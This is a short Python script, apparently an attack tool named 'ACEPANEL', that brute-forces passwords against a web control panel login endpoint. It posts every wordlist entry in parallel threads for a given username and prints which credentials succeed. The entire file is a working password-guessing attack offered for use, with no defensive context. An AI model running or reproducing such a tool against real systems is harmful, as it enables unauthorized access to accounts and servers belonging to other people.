from colorama import *
import requests
import sys
from multiprocessing import Pool

init(autoreset=True)

banner = f"""
{Fore.RED}
                 _____ ______ _____        _   _ ______ _     
           /\   / ____|  ____|  __ \ /\   | \ | |  ____| |     
          /  \ | |    | |__  | |__) /  \  |  \| | |__  | |     
         / /\ \| |    |  __| |  ___/ /\ \ | . ` |  __| | |     @author ACEVeen ~ www.imhatimi.org
        / ____ \ |____| |____| |  / ____ \| |\  | |____| |____
       /_/    \_\_____|______|_| /_/    \_\_| \_|______|______|

{Fore.LIGHTBLUE_EX}      Usage: python3 main.py <URL> <USERNAME> <WORDLIST> <THREADS>               
"""
print(banner)

url = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]
user_input = int(sys.argv[4])

def bf(password):
    data = {
        "user": username,
        "pass": password,
        "goto_uri": "/"
    }
    req = requests.post(url + '/login/?login_only=1', data=data)
    if '"status":1,' in req.text:
        print(Fore.LIGHTGREEN_EX + f"[+] Login Successful -> {username}:{password}")
    else:
        print(Fore.RED + f"[-] Login Failed -> {username}:{password}")

with open(wordlist, 'r') as f:
    passwords = [line.strip() for line in f]

pool = Pool(processes=user_input)
pool.map(bf, passwords)
pool.close()
pool.join()
